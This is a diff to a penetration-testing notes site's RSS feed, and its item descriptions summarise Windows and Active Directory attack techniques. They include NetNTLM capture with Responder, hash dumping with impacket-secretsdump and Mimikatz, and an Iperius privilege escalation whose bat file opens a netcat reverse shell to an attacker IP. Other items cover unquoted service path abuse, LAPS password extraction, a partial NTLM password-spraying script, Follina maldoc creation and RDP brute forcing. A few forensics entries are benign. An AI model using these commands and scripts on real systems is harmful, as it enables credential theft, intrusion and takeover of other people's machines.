+      <description>Exploitation linkTo carry out this attack, the OutlookSpy is required. So please install it before proceeding.&#xA;1. Start Responder linkFirst off, start responder in our local machine to capture NetNTLM authentication.&#xA;# -I: Interface (eth0, tun0, etc.) responder -I tun0 2. Modify Reminder Settings using OutlookSpy link In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.&#xA;In new Appointment window, select OutlookSpy tab then click CurrentItem.</description>
+    </item>
+    <item>
+      <title>Windows XML EventLog (EVTX)</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/forensics/windows-xml-eventlog/</link>
+      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/windows-xml-eventlog/</guid>
+      <description>Read EVTX in Linux linkWe can parse .evtx file in Linux using evtx_dump.&#xA;wget https://github.com/omerbenamram/evtx/releases/download/v0.8.1/evtx_dump-v0.8.1-x86_64-unknown-linux-gnu -O evtx_dump chmod &amp;#43;x evtx_dump ./evtx_dump example.evtx &amp;gt; parsed.txt Now we can find sensitive information from the parsed text.&#xA;grep -i TargetUserName parsed.txt grep -i TargetDomainName parsed.txt Search Suspicious Activity in EVTX linkChainsaw is a command-line tool to rapidly search and hunt through Windows Forensics Artifacts.&#xA;git clone https://github.com/WithSecureLabs/chainsaw.git cd chainsaw cargo build --release ./chainsaw hunt evtx_files/ -s sigma/rules --mapping mapping/sigma-event-logs-all.</description>
     </item>
     <item>
       <title>Microsoft Outlook Message (.msg)</title>
@@ -128,6 +275,41 @@
       <description>Start PowerShell linkOn Linux link pwsh # Execute PS commands without entering shell. pwsh -Command &amp;lt;cmdlet&amp;gt; On Windows link powershell # Bypass ExecutionPolicy powershell -ep bypass # check for the result PS&amp;gt; Get-ExecutionPolicy Commands linkOS Information link $PSVersionInfo Change Directory link&amp;lsquo;cd&amp;rsquo; in Linux.&#xA;Set-Location -Path c:\Users\Administrator\Desktop List Files link&amp;rsquo;ls&amp;rsquo; in Linux.&#xA;Get-ChildItem -File -Hidden Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue Get-ChildItem -Directory -Hidden Get-ChildItem -Directory -Hidden -Recurse -Filter &amp;#39;*secret*&amp;#39; -ErrorAction SilentlyContinue Get-ChildItem -Path .</description>
     </item>
     <item>
+      <title>Windows Disk Management</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/forensics/windows-disk-management/</link>
+      <pubDate>Thu, 09 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/forensics/windows-disk-management/</guid>
+      <description>Partitions linkCheck partitions with it.&#xA;Open the &amp;lsquo;Disk Management&amp;rsquo;&#xA;Right click the partition to view the properties&#xA;Check &amp;lsquo;Security&amp;rsquo; tab or &amp;lsquo;Shadow Copies&amp;rsquo; tab&#xA;Check Partition in Windows Explorer&#xA;Right click the partition and click &amp;lsquo;Change Drive Letter and Paths&amp;rsquo; Open dialog. Click &amp;lsquo;Add&amp;rsquo;. In the dropdown, choose a letter (ex. Z:) and click &amp;lsquo;OK&amp;rsquo;. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to.</description>
+    </item>
+    <item>
+      <title>Dumping Windows Password Hashes</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/dumping-windows-password-hashes/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/dumping-windows-password-hashes/</guid>
+      <description>Commands linkUsing Credentials link impacket-secretsdump example.local/username:password@&amp;lt;target-ip&amp;gt; # -just-dc: Extract only NTDS.DIT (NTLM hashes and kerberos keys). impacket-secretsdump -just-dc example.local/username:password@&amp;lt;target-ip&amp;gt; # -just-dc-ntlm: Extract only NTDS.DIT data (NTLM hashes only). impacket-secretsdump -just-dc-ntlm example.local/username:password@&amp;lt;target-ip&amp;gt; Using NTDS file or Hives link # -ntds: NTDS.DIT file to parse # -system: SYSTEM hive to parse impacket-secretsdump -ntds ntds.dit -system system LOCAL # -sam: SAM hive to parse # -security: SECURITY hive to parse # -system: SYSTEM hive to parse impacket-secretsdump -sam sam.</description>
+    </item>
+    <item>
+      <title>Iperius Backup Service Privilege Escalation</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/iperius-backup-service-privilege-escalation/</guid>
+      <description>Investigation linkFirst check if Iperius is running in target machine.&#xA;wmic service list | findstr &amp;#34;Iperius&amp;#34; If the Iperius service is running, we can gain access to administrator privilege.&#xA;Exploitation link1. Create a Payload linkIn target machine, create a .bat file named &amp;ldquo;exploit.bat&amp;rdquo;.&#xA;@echo off C:\Users\&amp;lt;USERNAME&amp;gt;\Downloads\nc.exe &amp;lt;attack_machine_ip&amp;gt; 1337 -e exploit.exe Then place it to Desktop.&#xA;When saving, be sure to save it as the file type &amp;ldquo;All Files&amp;rdquo; (NOT .txt).</description>
+    </item>
+    <item>
+      <title>Netlogon Elavasion of Privilege</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/netlogon-elavasion-of-privilege/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/netlogon-elavasion-of-privilege/</guid>
+      <description>Exploitation linkThere is a lot of Poc in online.&#xA;Here, we’ll use this repository from GitHub.</description>
+    </item>
+    <item>
+      <title>Windows PrivEsc with Unquoted Service Path</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</link>
+      <pubDate>Wed, 08 Feb 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/windows-privesc-with-unquoted-service-path/</guid>
+      <description>Investigation linkIn target machine, find unquoted service path.&#xA;wmic service get name,displayname,pathname,startmode | findstr /i &amp;#34;Auto&amp;#34; | findstr /i /v &amp;#34;C:\\Windows\\&amp;#34; | findstr /i /v &amp;#34;&amp;#34;&amp;#34; &amp;#34; Also query the configuration information for a service.&#xA;sc qc &amp;#34;Development Service&amp;#34; For instance if the service path is &amp;ldquo;C:\Program Files\Development Files\Devservice Files\Service.exe&amp;rdquo;, we can place the exploit to &amp;ldquo;C:\Program Files\Devservice.exe&amp;rdquo; by ignoring paths after a space.&#xA;Exploitation link1. Create a Payload linkIn local machine, create a payload using msvenom.</description>
+    </item>
+    <item>
       <title>Metasploit Cheat Sheets</title>
       <link>https://documentnation.github.io/docs/hdks/tool/metasploit-cheat-sheets/</link>
       <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
@@ -142,6 +324,20 @@
       <description>Enumeration link nmap --script rdp-enum-encryption -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp-ntlm-info -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp* -p 3389 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; rdp hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; rdp Connect linkRemmina linkRemmina is a remote desktop client for POSIX-based computer operating systems.&#xA;remmina # -c: Connect given URI or file remmina -c rdp://username@vulnerable.com remmina -c rdp://domain\\username@vulnerable.com remmina -c rdp://username:password@vulnerable.com # --------------------------------------------------------------------------------- # Settings # Keyboard mapping 1.</description>
     </item>
     <item>
+      <title>LAPS (Local Administrator Password Solution) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</link>
+      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/laps-pentesting/</guid>
+      <description>Enumeration link msfconsole use post/windows/gather/credentials/enum_laps set session 2 exploit Obtain Administrator&amp;rsquo;s Password linkFirst, check if you are in the LAPS_Readers group.&#xA;net user &amp;lt;current-username&amp;gt; # Global Group memberships *LAPS_Readers Using Get-ADComputer linkGet-ADComputer gets the information of the Active Directory computer.&#xA;Get-ADComputer -Identity &amp;#39;&amp;lt;active-directory-computer-name&amp;gt;&amp;#39; -property &amp;#39;ms-mcs-admpwd&amp;#39; Using Get-LAPSPasswords.ps1 link Download the Payload in Local Machine&#xA;If you are in LAPS_Readers, you can get the administrator&amp;rsquo;s password using Get-LAPSPasswords.ps1{:target=&amp;quot;_blank&amp;quot;}{:rel=&amp;ldquo;noopener&amp;rdquo;}.&#xA;wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1 Transfer the Payload to Target Machine</description>
+    </item>
+    <item>
+      <title>NTLM (New Technology LAN Manager) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ntlm-pentesting/</link>
+      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ntlm-pentesting/</guid>
+      <description>Password Spraying Attack (Brute Force Credentials) linkFirst off, prepare the wordlist of usernames.&#xA;anthony.reynolds samantha.thompson dawn.turner frances.chapman ... Next create the exploit for brute force attack.&#xA;#!/usr/bin/python3 import requests from requests_ntlm import HttpNtlmAuth import sys, getopt class NTLMSprayer: def __init__(self, fqdn): self.HTTP_AUTH_FAILED_CODE = 401 self.HTTP_AUTH_SUCCEED_CODE = 200 self.verbose = True self.fqdn = fqdn def load_users(self, userfile): self.users = [] lines = open(userfile, &amp;#39;r&amp;#39;).readlines() for line in lines: self.users.append(line.replace(&amp;#34;\r&amp;#34;, &amp;#34;&amp;#34;).replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;)) def password_spray(self, password, url): print (&amp;#34;[*] Starting passwords spray attack using the following password: &amp;#34; &amp;#43; password) count = 0 for user in self.</description>
+    </item>
+    <item>
       <title>PowerView</title>
       <link>https://documentnation.github.io/docs/hdks/windows/powershell/powerview/</link>
       <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
@@ -154,6 +350,13 @@
       <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
       <guid>https://documentnation.github.io/docs/hdks/windows/service/microsoft-word-pentesting/</guid>
       <description>Follina MSDT (CVE-2022-30190) linkMicrosoft Support Diagnostic Tool (MSDT) is vulnerable with Follina.&#xA;1. Download the Payload in Local Machine linkClone the payload from msdt-follina.&#xA;2. Create the Maldoc in Local Machine link # -i: interface name python3 follina.py -i eth0 Then a new maldoc named “follina.doc” will be created in the current directory.&#xA;Now you’ve started the web server.&#xA;3. Open Another Web Server in Local Machine linkOpen another terminal and move to the msdt-follina directory, then start web server to transfer the maldoc to target machine.</description>
+    </item>
+    <item>
+      <title>Mimikatz</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</link>
+      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</guid>
+      <description>You can download it from the GitHub repository.&#xA;Usage link mimikatz Check if Mimikatz Running as an Administrator&#xA;mimikatz # privilege::debug Elevate to SYSTEM Level&#xA;mimikatz # token::elevate Dump Hashes&#xA;mimikatz # lsadump::lsa /patch Security Identifier of the Kerberos Ticket Granting Ticket Account&#xA;mimikatz # lsadump::lsa /inject /name:krbtgt All SAM Local Password Hashes&#xA;mimikatz # lsadump::sam Credentials from the LSASS Memory&#xA;mimikatz # sekurlsa::logonpasswords Create a Kerberos Golden Ticket&#xA;mimikatz # kerberos::golden /user:Administrator /domain:sample.</description>
     </item>
   </channel>
 </rss>
